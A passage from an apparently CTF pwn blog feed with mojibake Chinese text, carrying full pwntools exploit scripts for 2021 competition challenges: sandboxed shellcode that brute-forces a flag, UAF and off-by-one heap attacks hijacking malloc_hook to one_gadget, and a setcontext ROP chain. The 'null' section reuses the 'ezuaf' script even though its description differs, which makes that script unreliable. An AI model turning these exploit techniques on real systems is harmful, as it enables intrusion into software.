<p>æœ€ååœ¨è°ƒç”¨å¯„å­˜å™¨è¿›è¡Œå¸ƒå±€getshellæ—¶ï¼Œæœ€å¥½æ˜¯è¦æŠŠä»£ç ä¸­çš„æŒ‡ä»¤è¿›è¡Œæ•´åˆï¼Œå°±åƒä¸Šé¢æ•´åˆçš„ä¸€æ ·ï¼Œè¿™æ ·å¯ä»¥åœ¨å†™è„šæœ¬ï¼Œè¿…é€ŸçŸ¥é“æ“ä½œç çš„å–å€¼ä»¥åŠæ“ä½œå¯¹è±¡çš„å€¼</p>
<p>ç„¶åï¼ŒåŠ æ²¹ï¼</p>
]]></content>
      <tags>
        <tag>VMpwn</tag>
      </tags>
  </entry>
  <entry>
    <title>2021è“å¸½æ¯</title>
    <url>/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰è¿˜æ˜¯ä¸ªèœé¸¡ï¼ŒåªæŠŠé¢˜ç›®æ”¶é›†äº†ï¼Œç°åœ¨ã€‚ã€‚ã€‚è¿˜æ˜¯èœé¸¡ï¼Œä½†æ„Ÿè§‰é¸¡è…¿ğŸ–å¯èƒ½å¤§äº†ç‚¹ï¼Œæ¥å¤ç°ä¸€ä¸‹è“å¸½æ¯çš„é¢˜ç›®ï¼ŒæŒç»­æ›´æ–°å§ï¼Œç›®å‰åº”è¯¥èƒ½æ›´æ–°åˆ°åŠå†³èµ›ï¼Œä¸ºä»€ä¹ˆæ²¡æœ‰æ€»å†³èµ›ï¼Ÿå› ä¸ºæ²¡æœ‰wpä¹Ÿæ²¡æœ‰é™„ä»¶</p>
<p>wpï¼š</p>
<p><a href="https://blog.csdn.net/qq_43678263/article/details/116277524">https://blog.csdn.net/qq_43678263/article/details/116277524</a></p>
<p><a href="https://www.lintstar.top/2020/12/784edd2e#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9-3">https://www.lintstar.top/2020/12/784edd2e#%E6%93%8D%E4%BD%9C%E5%86%85%E5%AE%B9-3</a></p>
<h2 id="silent"><a href="#silent" class="headerlink" title="silent"></a>silent</h2><p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211002191216443.png" alt="image-20211002191216443"></p>
<p>å¸¸è§„checksecï¼Œ64ä½ä¿æŠ¤å…¨å¼€</p>
<p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211002191600919.png" alt="image-20211002191600919"></p>
<p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211002192200578.png" alt="image-20211002192200578"></p>
<p>ç¨‹åºéå¸¸ç®€å•ï¼Œå°±è¿™ä¹ˆå‡ è¡Œä»£ç ã€‚å¼€äº†æ²™ç®±ï¼Œåªèƒ½ä½¿ç”¨ open å’Œ read </p>
<p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211002193705578.png" alt="image-20211002193705578"></p>
<p>mmapç”³è¯·åˆ°çš„å†…å­˜ä½äº0x10000~0x11000</p>
<p>å› ä¸ºä¼šè¯»å–æˆ‘ä»¬è¾“å…¥çš„æ•°æ®æ”¾ç½®åˆ°0x10000ä¸Šï¼Œå¹¶ä¸”ä¼šè¿›è¡Œè°ƒç”¨æ‰§è¡Œï¼Œæ‰€ä»¥å°±æ˜¯è¯»å–flagï¼Œä½†æ˜¯å› ä¸ºæ²¡æœ‰writeå‡½æ•°å¯ä»¥æ‰§è¡Œï¼Œé‚£å°±è¿›è¡Œå•ä¸ªå­—èŠ‚çš„å¯¹æ¯”çˆ†ï¼Œå³è¯»å–flagåˆ°ä¸€å—å†…å­˜åŒºåŸŸï¼Œéšåå•å­—èŠ‚çˆ†ç ´ï¼Œåœ¨shellcodeä¸­è®¾ç½®loopå¾ªç¯ï¼Œä¸€æ—¦cmpå‘½ä¸­å°±è®©ç¨‹åºå¡æ­»ï¼Œå¦åˆ™æ‰§è¡Œåé¢çš„exitå› ä¸ºæ²™ç®±ç¦ç”¨ç¨‹åºå´©æºƒé€€å‡ºï¼Œæ ¹æ®ç¨‹åºçš„è¡¨ç°å¯ä»¥åŒºåˆ†æ˜¯å¦å‘½ä¸­ï¼Œæ³¨æ„å› ä¸ºæœåŠ¡å™¨é€šä¿¡ä¸ç¨³å®šï¼Œæ¯æ¬¡è¯»åˆ°ä¸€æ®µflagå°±æ›´æ–°expä¸­çš„flagå­—ç¬¦ä¸²ç»§ç»­å‘åçˆ†ç ´</p>
<p><img src="/2021/10/02/2021-10-02-2021%E8%93%9D%E5%B8%BD%E6%9D%AF/image-20211003084329468.png" alt="image-20211003084329468"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.update(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>(<span class="hljs-params">dis,char</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Welcome to silent execution-box.\n&quot;</span>)<br>    sc = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            mov r12,0x67616c66</span><br><span class="hljs-string">            push r12</span><br><span class="hljs-string">            mov rdi,rsp</span><br><span class="hljs-string">            xor esi,esi</span><br><span class="hljs-string">            xor edx,edx</span><br><span class="hljs-string">            mov al,2</span><br><span class="hljs-string">            syscall</span><br><span class="hljs-string">            mov rdi,rax</span><br><span class="hljs-string">            mov rsi,0x10700</span><br><span class="hljs-string">            mov dl,0x40</span><br><span class="hljs-string">            xor rax,rax</span><br><span class="hljs-string">            syscall</span><br><span class="hljs-string">            mov dl, byte ptr [rsi+&#123;&#125;]</span><br><span class="hljs-string">            mov cl, &#123;&#125;</span><br><span class="hljs-string">            cmp cl,dl</span><br><span class="hljs-string">            jz loop</span><br><span class="hljs-string">            mov al,60</span><br><span class="hljs-string">            syscall</span><br><span class="hljs-string">            loop:</span><br><span class="hljs-string">            jmp loop</span><br><span class="hljs-string">            &#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(dis,char))<br>    p.send(sc)<br>flag = <span class="hljs-string">&quot;flag&#123;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag),<span class="hljs-number">35</span>):<br>    sleep(<span class="hljs-number">1</span>)<br>    log.success(<span class="hljs-string">&quot;flag : &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(flag))<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x20</span>,<span class="hljs-number">0x80</span>):<br>        p = process(<span class="hljs-string">&#x27;./chall&#x27;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            exp(i,j)<br>            p.recvline(timeout=<span class="hljs-number">1</span>)<br>            flag += <span class="hljs-built_in">chr</span>(j)<br>            p.send(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>            log.success(<span class="hljs-string">&quot;&#123;&#125; pos : &#123;&#125; success&quot;</span>.<span class="hljs-built_in">format</span>(i,<span class="hljs-built_in">chr</span>(j)))<br>            p.close()<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span>:           <br>            p.close()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>2021ç»¿åŸæ¯</title>
    <url>/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ¬¡PWNé¢˜å¯¹æˆ‘è¿™ç§pwnğŸ‘¶å¯ç®—æ˜¯å‹å¥½è‡³æé˜¿ï¼Œæ„Ÿå—ä¸€ä¸‹å¤§ä½¬åœ¨æ¯”èµ›ä¸­çš„æ€ç©¿çš„å¿«æ„Ÿï¼ä¸è¿‡è¿˜æ˜¯ä¸è¦è¢«è¿™äº›å‡è±¡è¿·äº†çœ¼ï¼Œå…¶å®è¿˜æ˜¯ä¸ªè¹’è·šå­¦æ­¥çš„pwnğŸ‘¶ï¼Œç»§ç»­åŠ æ²¹ï¼</p>
<p><img src="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/image-20211001115859860.png" alt="image-20211001115859860"></p>
<h2 id="ezuaf"><a href="#ezuaf" class="headerlink" title="ezuaf"></a>ezuaf</h2><p><img src="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/image-20210929173017054.png" alt="image-20210929173017054"></p>
<p>å¦‚é¢˜åå­—ï¼Œå­˜åœ¨UAFï¼Œå€Ÿç€UAFæ³„éœ²libcåœ°å€ï¼Œç„¶åç›´æ¥ä¿®æ”¹é‡Šæ”¾fastchunkçš„fdæŒ‡é’ˆæŒ‡å‘malloc_hookï¼ŒåŠ«æŒä¸ºone_gadgetå³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./uaf_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;82.157.5.28&quot;</span>,<span class="hljs-number">51602</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;size&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;content&gt;&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>target = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">&quot;target==&gt;0x%x&quot;</span> %target)<br>add(<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c4b78</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">2</span>, p64(mlh - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">4</span>, p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> +p64(ogg))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x20</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="null"><a href="#null" class="headerlink" title="null"></a>null</h2><p><img src="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/image-20210929173224666.png" alt="image-20210929173224666"></p>
<p>åœ¨ç”³è¯·åŠŸèƒ½é‡Œé¢çš„è¾“å…¥ç‚¹å­˜åœ¨å¾ˆæ˜æ˜¾çš„offbyoneï¼Œé€šè¿‡offbyoneåˆ¶é€ overlapï¼Œå¯ä»¥æ³„éœ²å‡ºlibcï¼Œç„¶åä¿®æ”¹è¢«é‡å çš„fastchunkçš„fdæŒ‡é’ˆæŒ‡å‘malloc_hookï¼ŒåŠ«æŒä¸ºone_gadgetå³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./uaf_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;82.157.5.28&quot;</span>,<span class="hljs-number">51602</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;size&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;content&gt;&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index&gt;&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>target = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>log.info(<span class="hljs-string">&quot;target==&gt;0x%x&quot;</span> %target)<br>add(<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c4b78</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>add(<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">2</span>, p64(mlh - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>)<br>edit(<span class="hljs-number">4</span>, p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> +p64(ogg))<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x20</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="GreentownNote"><a href="#GreentownNote" class="headerlink" title="GreentownNote"></a>GreentownNote</h2><p><img src="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/image-20210929172949043.png" alt="image-20210929172949043"></p>
<p>ç¨‹åºå­˜åœ¨UAFï¼Œå€Ÿç€UAFæŠŠå †å—åŠ«æŒåˆ°tcacheä¸Šï¼Œè·å¾—libcï¼ŒåŒæ—¶ä¿®æ”¹tcacheç»“æ„ï¼Œè·å¾—ä»»æ„åœ°å€å†™</p>
<p>å› ä¸ºå¼€äº†æ²™ç®±ï¼Œæ‰€ä»¥å †ä¸Šå¸ƒç½®ropé“¾è¿›è¡Œorw</p>
<p>æœ€åé‡Šæ”¾å †å—è§¦å‘setcontextå»æ‰§è¡Œåˆ°rop</p>
<p>å˜¿å˜¿ï¼Œç»è¿‡ä¸€æ®µæ—¶é—´çš„å­¦ä¹ ï¼Œæ€»ç®—æŒæ¡äº†è¿™ç§åœ¨å †ä¸Šå¸ƒç½®ropé“¾çš„æ‰‹æ³•äº†ï¼Œè¯¥å»å­¦ä¹ æ–°çš„çŸ¥è¯†äº†ï¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./GreentownNote&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;82.157.5.28&quot;</span>, <span class="hljs-number">52301</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt; Your choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;&gt; Note size :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;&gt; Content :&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt; Your choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;| Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;| Content: &quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt; Your choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;| Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x260</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br>add(<span class="hljs-number">0xf8</span>,p64(heap_base + <span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br>add(<span class="hljs-number">0xf8</span>,p64(<span class="hljs-number">0x0707070707070707</span>)*<span class="hljs-number">8</span>)<br>free(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br><br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base) <br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>syscall = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;syscall\nret&quot;</span>))) + libc_base<br>pop_rdi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>))) + libc_base<br>pop_rsi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>))) + libc_base<br>pop_rdx = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdx\nret&#x27;</span>))) + libc_base<br>pop_rax = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>))) + libc_base<br>ret = <span class="hljs-number">0x00000000000008aa</span> + libc_base<br>read = libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>] + libc_base <br>write = libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>] + libc_base<br>flag_addr = heap_base + <span class="hljs-number">0x260</span><br>rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rax) + p64(<span class="hljs-number">2</span>) + p64(syscall)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(read)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(write)<br><br>add(<span class="hljs-number">0xf8</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">17</span> + p64(free_hook) + p64(heap_base + <span class="hljs-number">0x1000</span>) + p64(heap_base + <span class="hljs-number">0x10c0</span>))<br>add(<span class="hljs-number">0xa0</span>,p64(setcontext))<br>add(<span class="hljs-number">0xb8</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">20</span> + p64(heap_base + <span class="hljs-number">0x10c0</span>) + p64(ret)) <br>add(<span class="hljs-number">0xc8</span>,rop)<br>free(<span class="hljs-number">4</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>2021ä¹æœˆDASCTF</title>
    <url>/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/</url>
